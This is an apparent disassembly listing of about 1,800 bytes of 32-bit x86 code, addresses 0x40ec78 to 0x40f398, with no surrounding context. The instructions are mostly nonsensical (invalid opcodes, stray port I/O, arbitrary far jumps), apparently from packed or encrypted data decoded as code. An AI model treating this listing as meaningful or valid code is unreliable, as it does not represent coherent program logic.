  40ec78:	gs cs test al,0xc
  40ec7c:	(bad)  
  40ec7d:	push   edi
  40ec7e:	in     al,0xc1
  40ec80:	shl    al,1
  40ec82:	xchg   BYTE PTR [ecx+0x3e],ah
  40ec85:	out    dx,eax
  40ec86:	fdivrp st(6),st
  40ec88:	test   ah,al
  40ec8a:	cmp    al,0x99
  40ec8c:	mov    bh,0xce
  40ec8e:	pop    esi
  40ec8f:	jg     0x40ed05
  40ec91:	add    al,0x75
  40ec93:	and    BYTE PTR [ebx],ah
  40ec95:	ins    BYTE PTR es:[edi],dx
  40ec96:	push   ebp
  40ec97:	ins    DWORD PTR es:[edi],dx
  40ec98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec99:	retf   0xafb5
  40ec9c:	push   0xe02cf79f
  40eca1:	sbb    al,0x26
  40eca3:	out    dx,al
  40eca4:	or     ah,ch
  40eca6:	mov    WORD PTR [ebx+eax*2-0x79],ds
  40ecaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecab:	push   ebp
  40ecac:	fnstsw WORD PTR [esi+0x1b9ef3b7]
  40ecb2:	lea    ebp,[eax-0x34]
  40ecb5:	adc    BYTE PTR [eax],bh
  40ecb7:	cmp    eax,0xb57934ec
  40ecbc:	sbb    DWORD PTR [ebx+eax*1-0x54],ebx
  40ecc0:	aaa    
  40ecc1:	or     eax,edx
  40ecc3:	les    ecx,FWORD PTR [ecx+0x21]
  40ecc6:	push   ds
  40ecc7:	pop    edx
  40ecc8:	mov    esi,0x5f1040f8
  40eccd:	jl     0x40ed47
  40eccf:	(bad)  
  40ecd0:	enter  0x52d,0x0
  40ecd4:	inc    esp
  40ecd5:	pop    esi
  40ecd6:	daa    
  40ecd7:	scas   eax,DWORD PTR es:[edi]
  40ecd8:	push   es
  40ecd9:	jb     0x40ed41
  40ecdb:	xchg   edi,eax
  40ecdc:	inc    edx
  40ecdd:	cmp    al,0x3b
  40ecdf:	jb     0x40ed15
  40ece1:	rol    al,0x53
  40ece4:	ret    0x28ef
  40ece7:	and    BYTE PTR [ecx+ebp*4],ah
  40ecea:	sub    BYTE PTR [ebx+edx*8-0x4e],0xe9
  40ecef:	sbb    eax,0x42ab5064
  40ecf4:	or     al,0x4c
  40ecf6:	push   esi
  40ecf7:	loope  0x40eca5
  40ecf9:	sbb    DWORD PTR [esi],eax
  40ecfb:	inc    esp
  40ecfc:	call   0x8184:0x2a2aca6d
  40ed03:	pushf  
  40ed04:	pushf  
  40ed05:	jl     0x40ece6
  40ed07:	inc    edx
  40ed08:	dec    ebx
  40ed09:	cmp    ah,BYTE PTR [edx]
  40ed0b:	cs mov esp,0x939390a7
  40ed11:	aam    0x53
  40ed13:	sub    BYTE PTR [ebp+0x38544da5],bl
  40ed19:	jge    0x40ed85
  40ed1b:	xor    eax,edi
  40ed1d:	(bad)  
  40ed1e:	cwde   
  40ed1f:	fistp  QWORD PTR [ebx]
  40ed21:	ja     0x40ed90
  40ed23:	jb     0x40ed14
  40ed25:	push   edx
  40ed26:	(bad)  
  40ed27:	jno    0x40ed6b
  40ed29:	repnz push 0xffffff95
  40ed2c:	mov    dh,0x72
  40ed2e:	test   DWORD PTR [esp+ecx*8-0x7450f48d],edx
  40ed35:	test   al,0x43
  40ed37:	or     al,0xe1
  40ed39:	adc    edi,0xffffff94
  40ed3c:	xor    ecx,ebx
  40ed3e:	jmp    0x7c189cd4
  40ed43:	push   ds
  40ed44:	es xchg edx,eax
  40ed46:	push   cs
  40ed47:	push   es
  40ed48:	xchg   esp,eax
  40ed49:	loopne 0x40ed4e
  40ed4b:	mov    eax,ds
  40ed4d:	mov    esi,0x69d68c7b
  40ed52:	aad    0x97
  40ed54:	out    dx,eax
  40ed55:	es imul ebx,edi,0x27
  40ed59:	or     esi,DWORD PTR [eax]
  40ed5b:	sub    DWORD PTR [edx-0x4],eax
  40ed5e:	mov    eax,0xb832dc1a
  40ed63:	mov    eax,0x74daa605
  40ed68:	xchg   BYTE PTR [edx+0x5d772f78],bh
  40ed6e:	pop    ecx
  40ed6f:	(bad)  
  40ed71:	fisttp QWORD PTR [ebp+0x38]
  40ed74:	call   0xff5b8f07
  40ed79:	jae    0x40ed01
  40ed7b:	and    eax,0xd494213d
  40ed80:	loope  0x40ed6f
  40ed82:	test   ecx,0x6a50c7f4
  40ed88:	pop    eax
  40ed89:	mov    al,0x48
  40ed8b:	rol    ecx,cl
  40ed8d:	ror    DWORD PTR [ebx-0x36],0x3b
  40ed91:	mov    eax,0xa34abe51
  40ed96:	pmulhuw mm2,QWORD PTR [ebx+0x40]
  40ed9a:	int3   
  40ed9b:	cmc    
  40ed9c:	xchg   ebx,eax
  40ed9d:	sbb    cl,BYTE PTR cs:[edi]
  40eda0:	(bad)  
  40eda1:	loop   0x40ed61
  40eda3:	adc    BYTE PTR [ecx+ecx*2],dh
  40eda6:	xchg   esi,eax
  40eda7:	or     BYTE PTR [ebp+0x10b353e7],al
  40edad:	cmc    
  40edae:	lea    ebp,[eax+0x3b]
  40edb1:	sti    
  40edb2:	pushf  
  40edb3:	aad    0xb9
  40edb5:	jmp    0x6641:0x4292cd80
  40edbc:	dec    ebx
  40edbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edbe:	cwde   
  40edbf:	and    al,0x90
  40edc1:	fmul   DWORD PTR [ebx]
  40edc3:	(bad)  
  40edc4:	pusha  
  40edc5:	adc    dh,cl
  40edc7:	mov    dh,0xe9
  40edc9:	mov    dh,0xfc
  40edcb:	sar    BYTE PTR [edi+0x1f],0x58
  40edcf:	retf   0xc4f3
  40edd2:	xchg   esi,eax
  40edd3:	xor    eax,ebx
  40edd5:	aas    
  40edd6:	(bad)  
  40edd7:	and    bl,bh
  40edd9:	xor    al,BYTE PTR fs:[ecx]
  40eddc:	inc    esi
  40eddd:	dec    esi
  40edde:	lods   al,BYTE PTR ds:[esi]
  40eddf:	adc    DWORD PTR [edx],esi
  40ede1:	jne    0x40ee3b
  40ede3:	inc    esi
  40ede4:	sbb    DWORD PTR [edi+ebp*2],esp
  40ede7:	adc    al,0xcf
  40ede9:	es pop ss
  40edeb:	ret    
  40edec:	loopne 0x40ed90
  40edee:	push   0x117801ba
  40edf3:	cmp    DWORD PTR [edx-0x47],0x3c
  40edf7:	mov    dl,0xda
  40edf9:	pop    esp
  40edfa:	push   ecx
  40edfb:	arpl   WORD PTR [ecx+edx*2+0x7b],si
  40edff:	mov    eax,ds:0x95b4ff19
  40ee04:	xchg   BYTE PTR [ecx+0xc0838c2],bh
  40ee0a:	test   cl,dl
  40ee0c:	out    0x78,eax
  40ee0e:	popa   
  40ee0f:	mov    DWORD PTR [eax],0xc5ccdd53
  40ee15:	repnz out 0x82,al
  40ee18:	scas   al,BYTE PTR es:[edi]
  40ee19:	mov    ds:0xba665287,eax
  40ee1e:	ret    
  40ee1f:	push   edi
  40ee20:	out    dx,al
  40ee21:	sub    al,0x35
  40ee23:	fs addr16 xchg esi,eax
  40ee26:	mov    bl,0x8a
  40ee28:	cmp    BYTE PTR [ecx-0xf],bh
  40ee2b:	cmp    al,0xb8
  40ee2d:	pop    ebx
  40ee2e:	call   0xb13c742d
  40ee33:	ins    DWORD PTR es:[edi],dx
  40ee34:	pop    ebp
  40ee35:	inc    eax
  40ee36:	add    al,cl
  40ee38:	mov    esi,0x14cc28c6
  40ee3d:	xchg   DWORD PTR [ebx],ecx
  40ee3f:	fidiv  WORD PTR [edx]
  40ee41:	(bad)  
  40ee43:	and    eax,0x9fb6fdd4
  40ee48:	xor    BYTE PTR [edi],ch
  40ee4a:	cmp    BYTE PTR [edi-0xd124121],bh
  40ee50:	add    ebp,ebx
  40ee52:	hlt    
  40ee53:	jbe    0x40ee74
  40ee55:	js     0x40ee6e
  40ee57:	fwait
  40ee58:	xchg   esi,eax
  40ee59:	scas   eax,DWORD PTR es:[edi]
  40ee5a:	call   0x74d75058
  40ee5f:	xchg   esp,eax
  40ee60:	mov    al,ds:0xb68f4120
  40ee65:	and    DWORD PTR [ebx-0x12],esi
  40ee68:	sbb    dl,BYTE PTR [ecx-0x44]
  40ee6b:	dec    edx
  40ee6c:	cli    
  40ee6d:	cmc    
  40ee6e:	cmp    al,0xe3
  40ee70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee71:	and    eax,0xc540b8ea
  40ee76:	push   0xc12bd956
  40ee7b:	mov    bl,0xdf
  40ee7d:	xchg   cl,al
  40ee7f:	mov    ah,BYTE PTR [esi-0x46]
  40ee82:	adc    al,0xe8
  40ee84:	mov    ebx,0x63713d08
  40ee89:	mov    bl,0x55
  40ee8b:	xchg   ebx,eax
  40ee8c:	push   0x56c1915f
  40ee91:	nop
  40ee92:	popf   
  40ee93:	mov    ds:0x7b98cb30,eax
  40ee98:	pusha  
  40ee99:	mov    ds:0xb2e57dd4,al
  40ee9e:	sahf   
  40ee9f:	add    DWORD PTR [esi+0x58],esp
  40eea2:	pop    esp
  40eea3:	jno    0x40ee8a
  40eea5:	sub    al,0x1b
  40eea7:	push   ebp
  40eea8:	push   0x13cd3df0
  40eead:	cmp    BYTE PTR [eax+0x39],bh
  40eeb0:	cmc    
  40eeb1:	mov    bh,0xe4
  40eeb3:	inc    ecx
  40eeb4:	jb     0x40ee75
  40eeb6:	add    ah,cl
  40eeb8:	(bad)  
  40eeb9:	scas   eax,DWORD PTR es:[edi]
  40eeba:	test   eax,0x1786f8b
  40eebf:	cld    
  40eec0:	jo     0x40ee64
  40eec2:	das    
  40eec3:	xor    BYTE PTR [ecx+0x70],cl
  40eec6:	fdiv   DWORD PTR [edi]
  40eec8:	dec    edi
  40eec9:	fbstp  TBYTE PTR [eax]
  40eecb:	and    eax,0x48258480
  40eed0:	icebp  
  40eed1:	int    0xbb
  40eed3:	mov    ds:0x2255bbb7,eax
  40eed8:	idiv   DWORD PTR [eax+0x76]
  40eedb:	mov    ah,0x58
  40eedd:	(bad)  
  40eede:	(bad)  
  40eedf:	dec    esi
  40eee0:	mov    edx,0x7bc52ca2
  40eee5:	out    0x31,al
  40eee7:	div    ah
  40eee9:	outs   dx,BYTE PTR ds:[esi]
  40eeea:	pop    ebp
  40eeeb:	lea    ebx,[esi]
  40eeed:	mov    eax,ds:0x4653c069
  40eef2:	iret   
  40eef3:	jb     0x40ee8a
  40eef5:	lods   eax,DWORD PTR ds:[esi]
  40eef6:	jge    0x40ee94
  40eef8:	pop    esi
  40eef9:	or     al,0x65
  40eefb:	lea    ebp,[esi+0x1c737110]
  40ef01:	push   edi
  40ef02:	xchg   DWORD PTR [esi+0x6f80dd97],ebx
  40ef08:	and    dh,BYTE PTR [ebx-0x2a95578c]
  40ef0e:	push   es
  40ef0f:	sub    BYTE PTR [edx+0x7c],bl
  40ef12:	sub    DWORD PTR [ebx],ecx
  40ef14:	xchg   BYTE PTR [edi],al
  40ef16:	xchg   edi,eax
  40ef17:	stos   BYTE PTR es:[edi],al
  40ef18:	dec    esi
  40ef19:	and    DWORD PTR [ecx-0x20],0xffffffa0
  40ef1d:	ss inc edi
  40ef1f:	sbb    BYTE PTR ds:0x49b19fe9,ch
  40ef25:	add    DWORD PTR [ebp+0x1e],0xfffffffa
  40ef29:	leave  
  40ef2a:	int    0x8f
  40ef2c:	repz sbb DWORD PTR [edx],0x1ea82f4f
  40ef33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef34:	in     eax,dx
  40ef35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef36:	cmc    
  40ef37:	ja     0x40ef01
  40ef39:	xchg   edx,eax
  40ef3a:	pop    edx
  40ef3b:	mov    ah,0xc4
  40ef3d:	sti    
  40ef3e:	push   esp
  40ef3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef40:	jmp    0xef3e:0x30c36096
  40ef47:	and    ecx,DWORD PTR [ecx+0x55]
  40ef4a:	push   0x7be001b4
  40ef4f:	cmp    DWORD PTR [ebp-0x27dbf7b0],eax
  40ef55:	push   ss
  40ef56:	jns    0x40ef09
  40ef58:	push   edi
  40ef59:	in     al,dx
  40ef5a:	retf   
  40ef5b:	popa   
  40ef5c:	loope  0x40ef23
  40ef5e:	sbb    BYTE PTR [ecx-0x21],dh
  40ef61:	sahf   
  40ef62:	jmp    0xb515:0xce61f356
  40ef69:	jne    0x40ef3b
  40ef6b:	pop    esp
  40ef6c:	lods   eax,DWORD PTR ds:[esi]
  40ef6d:	adc    al,0x50
  40ef70:	push   es
  40ef71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef72:	pop    ds
  40ef73:	pushf  
  40ef74:	out    dx,al
  40ef75:	rol    ebp,0x28
  40ef78:	sbb    BYTE PTR [edi-0x7d],bh
  40ef7b:	in     eax,0x63
  40ef7d:	neg    DWORD PTR [esi-0x5277363c]
  40ef83:	cwde   
  40ef84:	lods   eax,DWORD PTR ds:[esi]
  40ef85:	adc    al,0x2d
  40ef87:	pop    ecx
  40ef88:	hlt    
  40ef89:	cmc    
  40ef8a:	stos   DWORD PTR es:[edi],eax
  40ef8b:	or     DWORD PTR [edx+edx*2],ecx
  40ef8e:	shl    edx,cl
  40ef90:	ins    DWORD PTR es:[edi],dx
  40ef91:	pop    edi
  40ef92:	fwait
  40ef93:	in     eax,0x9
  40ef95:	xchg   ecx,eax
  40ef96:	or     BYTE PTR [ebx-0x390689cb],ah
  40ef9c:	movups xmm7,xmm5
  40ef9f:	ret    
  40efa0:	aam    0x24
  40efa2:	cmc    
  40efa3:	sbb    al,0x74
  40efa5:	mov    DWORD PTR [edx-0x40f004ca],ecx
  40efab:	push   ebp
  40efac:	scas   eax,DWORD PTR es:[edi]
  40efad:	mov    WORD PTR [ebx-0x538e0e0e],es
  40efb3:	lods   eax,DWORD PTR ds:[esi]
  40efb4:	dec    edx
  40efb5:	daa    
  40efb6:	popa   
  40efb7:	push   ebp
  40efb8:	jnp    0x40f000
  40efba:	stos   DWORD PTR es:[edi],eax
  40efbb:	mov    bh,0x9f
  40efbd:	or     ebx,DWORD PTR [edi-0x4f]
  40efc0:	adc    ch,BYTE PTR [esi]
  40efc2:	jle    0x40ef8c
  40efc4:	mov    ds:0xb328df08,al
  40efc9:	out    dx,al
  40efca:	jge    0x40efd5
  40efcc:	fst    st(3)
  40efce:	push   esp
  40efcf:	dec    esp
  40efd0:	mov    DWORD PTR [eax],ebx
  40efd2:	mul    DWORD PTR ds:0xcbf07168
  40efd8:	aad    0x3e
  40efda:	ffreep st(4)
  40efdc:	enter  0x9496,0xf0
  40efe0:	push   esp
  40efe1:	jle    0x40f048
  40efe3:	ins    BYTE PTR es:[edi],dx
  40efe4:	rol    DWORD PTR [esi],1
  40efe6:	xlat   BYTE PTR ds:[ebx]
  40efe7:	sub    bh,BYTE PTR [eax]
  40efe9:	(bad)  
  40efea:	stos   DWORD PTR es:[edi],eax
  40efeb:	push   es
  40efec:	cmp    BYTE PTR [ebx],al
  40efee:	cmp    DWORD PTR [edi+0x673fe538],edi
  40eff4:	dec    esi
  40eff5:	test   al,0xeb
  40eff7:	in     eax,0x5f
  40eff9:	push   0x24bf1592
  40effe:	push   cs
  40efff:	mov    ecx,esi
  40f001:	pop    ebx
  40f002:	push   0x3a
  40f004:	dec    edi
  40f005:	hlt    
  40f006:	xlat   BYTE PTR ds:[ebx]
  40f007:	out    dx,eax
  40f008:	rol    BYTE PTR [edx+0xbc5d786],1
  40f00e:	pop    ecx
  40f00f:	mov    ds:0xcceea40d,al
  40f014:	inc    ebx
  40f015:	fcmovnb st,st(1)
  40f017:	ficomp DWORD PTR [esi+0x956c83a]
  40f01d:	pop    esp
  40f01e:	into   
  40f01f:	dec    eax
  40f020:	ja     0x40effa
  40f022:	dec    esi
  40f023:	in     eax,dx
  40f024:	mov    al,ds:0xb3f3e533
  40f029:	ins    DWORD PTR es:[edi],dx
  40f02a:	or     ebx,DWORD PTR [ebx+0x67]
  40f02d:	sub    edx,esp
  40f02f:	xor    bl,bh
  40f031:	add    ah,BYTE PTR [eax+ebp*8-0x64]
  40f035:	adc    esi,ecx
  40f037:	mov    edx,0x98ea9187
  40f03c:	stos   BYTE PTR es:[edi],al
  40f03d:	(bad)  
  40f03e:	fdiv   st,st(5)
  40f040:	or     eax,DWORD PTR [eax+0x15]
  40f043:	xchg   ebp,eax
  40f044:	adc    ch,BYTE PTR [eax]
  40f046:	fiadd  WORD PTR [eax+eiz*4-0x9df7acc]
  40f04d:	aaa    
  40f04e:	ficom  DWORD PTR [ebx-0x22]
  40f051:	pop    ebx
  40f052:	sbb    bl,BYTE PTR [esi+0x35]
  40f055:	ins    BYTE PTR es:[edi],dx
  40f056:	sbb    eax,0xd454dad7
  40f05b:	cmp    esp,DWORD PTR [esi]
  40f05d:	mov    cl,0xc7
  40f05f:	fs enter 0xfbbb,0xea
  40f064:	xor    eax,0x59a6d866
  40f069:	push   es
  40f06a:	int    0x89
  40f06c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f06d:	popa   
  40f06e:	mov    ds:0xfaeabe80,eax
  40f073:	xor    DWORD PTR cs:[ebx-0x7a],ebp
  40f077:	ret    0xa50e
  40f07a:	adc    DWORD PTR [esp+esi*1],esp
  40f07d:	(bad)  
  40f07e:	mov    dl,0xf0
  40f080:	inc    ebx
  40f081:	xor    DWORD PTR [eax-0x72],edx
  40f084:	or     BYTE PTR [eax+0x6a],dl
  40f087:	pop    edi
  40f088:	in     eax,dx
  40f089:	(bad)  
  40f08a:	pop    esi
  40f08b:	push   ebx
  40f08c:	xchg   ebp,eax
  40f08d:	rcr    edi,1
  40f08f:	sub    eax,0x170af562
  40f094:	cs jl  0x40f068
  40f097:	lods   eax,DWORD PTR ds:[esi]
  40f098:	inc    eax
  40f099:	push   0x1d
  40f09b:	in     al,0x86
  40f09d:	pop    esp
  40f09e:	sbb    DWORD PTR [edx-0x78],0x4
  40f0a2:	or     cl,al
  40f0a4:	jle    0x40f044
  40f0a6:	sbb    eax,0xc9c3d42f
  40f0ab:	dec    edx
  40f0ac:	in     eax,0x8c
  40f0ae:	adc    ecx,DWORD PTR [edi+edi*4+0x7eb83925]
  40f0b5:	ficom  WORD PTR [ebp+edx*2+0x30]
  40f0b9:	and    eax,0xa2d6799d
  40f0be:	sub    DWORD PTR [ecx+0x47],edx
  40f0c1:	stos   BYTE PTR es:[edi],al
  40f0c2:	xor    DWORD PTR [ecx],edx
  40f0c4:	mov    edx,esp
  40f0c6:	jecxz  0x40f0d7
  40f0c8:	icebp  
  40f0c9:	dec    esi
  40f0ca:	aas    
  40f0cb:	push   ecx
  40f0cc:	shr    DWORD PTR [edx],cl
  40f0ce:	mov    ds:0xd5b5384d,eax
  40f0d3:	aam    0x37
  40f0d5:	shl    DWORD PTR [edx+0x1e0050ce],0x31
  40f0dc:	fs ret 0xe6be
  40f0e0:	ins    BYTE PTR es:[edi],dx
  40f0e1:	aad    0x6f
  40f0e3:	bsf    edi,DWORD PTR [esi+0x5ad77360]
  40f0ea:	fnstcw WORD PTR [edx+0x51d3c5f6]
  40f0f0:	adc    ah,BYTE PTR [edi+eax*8]
  40f0f3:	enter  0x595,0x4f
  40f0f7:	xor    al,0x59
  40f0f9:	lods   eax,DWORD PTR ds:[esi]
  40f0fa:	or     BYTE PTR [edi],0x65
  40f0fd:	adc    eax,0xc75c78bd
  40f102:	cld    
  40f103:	daa    
  40f104:	fidiv  WORD PTR [esi-0x2ad01c35]
  40f10a:	adc    edx,DWORD PTR [edi]
  40f10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f10d:	clc    
  40f10e:	(bad)  
  40f10f:	in     al,0x57
  40f111:	fnstsw WORD PTR ds:0xff4874b9
  40f117:	stos   DWORD PTR es:[edi],eax
  40f118:	ins    BYTE PTR es:[edi],dx
  40f119:	dec    esp
  40f11a:	bound  ebx,QWORD PTR [ebx+0x34aa4bfe]
  40f120:	pusha  
  40f121:	rcr    bh,1
  40f123:	add    esp,DWORD PTR [esi-0x68]
  40f126:	out    0x8a,eax
  40f128:	pop    esi
  40f129:	and    BYTE PTR [ecx+0x44a2dfde],0x6
  40f130:	jns    0x40f145
  40f132:	imul   ebp,DWORD PTR [esi+0x44549d3e],0x4ea1c3f7
  40f13c:	out    0x49,al
  40f13e:	and    eax,0x3aa68e15
  40f143:	dec    esi
  40f144:	push   es
  40f145:	in     eax,dx
  40f146:	mov    ecx,0xc5236c3b
  40f14b:	ret    0x39b2
  40f14e:	loop   0x40f1c3
  40f150:	inc    esi
  40f151:	mov    ebx,0xa0bce21c
  40f156:	icebp  
  40f157:	pop    ecx
  40f158:	cmp    bh,BYTE PTR [ecx+0x8]
  40f15b:	cli    
  40f15c:	cdq    
  40f15d:	and    esp,eax
  40f15f:	scas   al,BYTE PTR es:[edi]
  40f160:	or     al,0x58
  40f162:	in     eax,0x3d
  40f164:	shl    BYTE PTR [edx],cl
  40f166:	dec    esi
  40f167:	mov    eax,ds:0x5b3fa9a3
  40f16c:	xchg   DWORD PTR [eax+0x6dfa3d07],esp
  40f172:	adc    eax,0xf17f46a4
  40f177:	adc    BYTE PTR [eax-0x13987779],bh
  40f17d:	ins    DWORD PTR es:[edi],dx
  40f17e:	push   esi
  40f17f:	and    edi,eax
  40f181:	pop    esp
  40f182:	outs   dx,BYTE PTR ds:[esi]
  40f183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f184:	inc    ebx
  40f185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f186:	rep ss ins BYTE PTR es:[edi],dx
  40f189:	out    dx,al
  40f18a:	adc    edi,eax
  40f18c:	adc    dl,BYTE PTR [edx-0x2e]
  40f18f:	cmp    ecx,DWORD PTR [ecx-0x56a96e56]
  40f195:	push   0xb82ccf8a
  40f19a:	fmul   QWORD PTR [ecx]
  40f19c:	sbb    bl,cl
  40f19e:	lock jge 0x40f1c9
  40f1a1:	xor    al,0x41
  40f1a3:	mov    ch,bh
  40f1a5:	or     DWORD PTR [esi+edi*1],esi
  40f1a8:	scas   al,BYTE PTR es:[edi]
  40f1a9:	add    edx,DWORD PTR [edi+0x1e7b7a2c]
  40f1af:	aas    
  40f1b0:	add    eax,DWORD PTR [esi-0x58]
  40f1b3:	xchg   ebp,eax
  40f1b4:	dec    edi
  40f1b5:	push   ecx
  40f1b6:	ins    BYTE PTR es:[edi],dx
  40f1b7:	jae    0x40f160
  40f1b9:	lea    esp,[eax+0x121766a]
  40f1bf:	pop    esp
  40f1c0:	sahf   
  40f1c1:	or     al,0x40
  40f1c3:	into   
  40f1c4:	sti    
  40f1c5:	xchg   edx,eax
  40f1c6:	lea    ebx,[edi]
  40f1c8:	push   ebx
  40f1c9:	imul   ecx
  40f1cb:	push   es
  40f1cc:	test   BYTE PTR [edi],bl
  40f1ce:	jg     0x40f1c9
  40f1d0:	push   ebx
  40f1d1:	out    dx,al
  40f1d2:	and    al,BYTE PTR [edi+0x4cee2f22]
  40f1d8:	leave  
  40f1d9:	and    edx,edx
  40f1db:	xchg   DWORD PTR [edi],esp
  40f1dd:	jge    0x40f1d7
  40f1df:	repz sbb BYTE PTR [ebx],0x92
  40f1e3:	and    BYTE PTR [edi+0x56],al
  40f1e6:	and    ebx,DWORD PTR [eax+0x6c41bb7c]
  40f1ec:	(bad)  
  40f1ee:	retf   0xd689
  40f1f1:	sub    eax,edi
  40f1f3:	inc    ebx
  40f1f4:	mov    WORD PTR [esi],ds
  40f1f6:	pushf  
  40f1f7:	xchg   edi,eax
  40f1f8:	loop   0x40f1dc
  40f1fa:	add    eax,0x63f6756a
  40f1ff:	mov    ecx,0xec5d6dd4
  40f204:	out    dx,al
  40f205:	push   esi
  40f206:	jg     0x40f209
  40f208:	inc    ebp
  40f209:	shl    ebx,1
  40f20b:	into   
  40f20c:	outs   dx,BYTE PTR ds:[esi]
  40f20d:	pushf  
  40f20e:	mov    al,ds:0x4fefcce5
  40f213:	repz push 0x39
  40f216:	call   0xf353:0x935fc793
  40f21d:	in     al,0xb6
  40f21f:	ret    
  40f220:	xor    al,0xdc
  40f222:	add    eax,0x4c0feb4a
  40f227:	jmp    0x6b6efeef
  40f22c:	aad    0xb2
  40f22e:	push   ebx
  40f22f:	aam    0x2d
  40f231:	scas   eax,DWORD PTR es:[edi]
  40f232:	and    ebx,ebp
  40f234:	jmp    0x4fdd:0x563f0374
  40f23b:	mov    esi,?
  40f23d:	aaa    
  40f23e:	dec    ebp
  40f23f:	in     al,0x66
  40f241:	mov    al,0x7d
  40f243:	scas   al,BYTE PTR es:[edi]
  40f244:	dec    edx
  40f245:	adc    eax,0x50378403
  40f24a:	iret   
  40f24b:	aas    
  40f24c:	xchg   esp,eax
  40f24e:	shr    bl,1
  40f250:	sbb    BYTE PTR [ecx+0x38378055],al
  40f256:	xchg   BYTE PTR [ebx],dh
  40f258:	mov    al,ds:0x7512ea21
  40f25d:	mov    dl,0x3b
  40f25f:	mov    al,0x3f
  40f261:	and    al,0x35
  40f263:	mov    edx,0xb4de7ffd
  40f268:	and    DWORD PTR [eax+0x6f],0x1a234d1f
  40f26f:	push   0x39689cad
  40f274:	add    esi,DWORD PTR [eax+edi*2+0x57e51946]
  40f27b:	(bad)  
  40f27c:	xchg   esp,eax
  40f27d:	in     al,dx
  40f27e:	jge    0x40f23b
  40f280:	pop    ebx
  40f281:	dec    edx
  40f282:	xlat   BYTE PTR ds:[ebx]
  40f283:	arpl   ax,di
  40f285:	sub    ecx,esp
  40f287:	test   BYTE PTR [eax+ecx*2-0x4f],ch
  40f28b:	adc    DWORD PTR [eax-0x14],0xe69fbdbe
  40f292:	mov    DWORD PTR [ebx+0x79c911d7],eax
  40f298:	stos   BYTE PTR es:[edi],al
  40f299:	jmp    0xeaeb66a2
  40f29e:	inc    esi
  40f29f:	pop    esp
  40f2a0:	push   ds
  40f2a1:	push   0xffffff86
  40f2a3:	cld    
  40f2a4:	js     0x40f2b2
  40f2a6:	xchg   ebx,eax
  40f2a7:	leave  
  40f2a8:	pop    edx
  40f2a9:	xchg   ebp,eax
  40f2aa:	jo     0x40f25c
  40f2ac:	push   ds
  40f2ad:	cmp    ecx,edx
  40f2af:	mov    cl,0x1d
  40f2b1:	mov    ebp,0x8021f595
  40f2b6:	pusha  
  40f2b7:	jl     0x40f242
  40f2b9:	adc    eax,0x9eb4f378
  40f2be:	rcl    BYTE PTR [esi],cl
  40f2c0:	les    edi,FWORD PTR [esi]
  40f2c2:	or     DWORD PTR [ebx-0x5a],esi
  40f2c5:	xlat   BYTE PTR ds:[ebx]
  40f2c6:	je     0x40f290
  40f2c8:	je     0x40f2d9
  40f2ca:	inc    ebp
  40f2cb:	xchg   DWORD PTR [edx],ebx
  40f2cd:	test   DWORD PTR [eax+0x91e536c],edx
  40f2d3:	hlt    
  40f2d4:	pushf  
  40f2d5:	shl    dl,cl
  40f2d7:	add    DWORD PTR ds:0x94a3bf50,ebp
  40f2dd:	mov    DWORD PTR [ecx+0x62dbec8e],ecx
  40f2e3:	sub    eax,0x81f18638
  40f2e8:	test   BYTE PTR [edi-0x1d],0xce
  40f2ec:	xor    bh,0x7e
  40f2ef:	pusha  
  40f2f0:	mov    edi,DWORD PTR [edx]
  40f2f2:	test   DWORD PTR [ebx+0x5fdd38ec],eax
  40f2f8:	sub    cl,BYTE PTR [ebx+0x6d]
  40f2fb:	xchg   ebp,eax
  40f2fc:	inc    esi
  40f2fd:	bound  edx,QWORD PTR [ebx+0x729c5470]
  40f303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f304:	cmp    eax,0x165db84f
  40f309:	jmp    0x40f2aa
  40f30b:	push   0x2a8efedf
  40f310:	lock outs dx,BYTE PTR ds:[esi]
  40f312:	sbb    edx,0x69751bf8
  40f318:	sub    edx,DWORD PTR [edx-0x5f]
  40f31b:	aad    0xca
  40f31d:	pop    edx
  40f31e:	cs push ebx
  40f320:	and    edx,ebx
  40f322:	cwde   
  40f323:	out    0x22,al
  40f325:	cmc    
  40f326:	inc    edx
  40f327:	and    BYTE PTR ds:0xaa5560d,al
  40f32d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f32e:	push   ebx
  40f32f:	pop    esi
  40f330:	and    al,0xf0
  40f332:	mov    dh,0x97
  40f334:	cmp    cl,bh
  40f336:	retf   
  40f337:	mov    cl,0xba
  40f339:	out    0x3f,eax
  40f33b:	mov    ss,eax
  40f33d:	imul   edx,DWORD PTR [edx],0x7b
  40f340:	inc    BYTE PTR [esi-0x3]
  40f343:	je     0x40f2e1
  40f345:	daa    
  40f346:	dec    eax
  40f347:	sti    
  40f348:	cmp    bh,ah
  40f34a:	sub    esp,edi
  40f34c:	jge    0x40f2e7
  40f34e:	jge    0x40f2da
  40f350:	jno    0x40f3a2
  40f352:	leave  
  40f353:	loopne 0x40f33e
  40f355:	mov    esi,0xe3932bed
  40f35a:	and    eax,0xa849adf9
  40f35f:	cmp    eax,0x130cc611
  40f364:	adc    eax,0x7a16c1e
  40f369:	int3   
  40f36a:	sub    ah,dl
  40f36c:	pop    ss
  40f36d:	sbb    esi,esi
  40f36f:	sub    ah,dl
  40f371:	fbld   TBYTE PTR [ebx*8-0x5cec5f98]
  40f378:	in     al,dx
  40f379:	int3   
  40f37a:	add    DWORD PTR [edi-0x5e],ecx
  40f37d:	jo     0x40f3ee
  40f37f:	adc    ah,BYTE PTR [ebp+0xb05bd54]
  40f385:	mov    bh,0xa
  40f387:	push   ecx
  40f388:	xor    dh,al
  40f38a:	mov    edx,0x5922a95e
  40f38f:	test   al,0xca
  40f391:	cwde   
  40f392:	jmp    0xca3a163c
  40f397:	(bad)  
  40f398:	ss pushf 
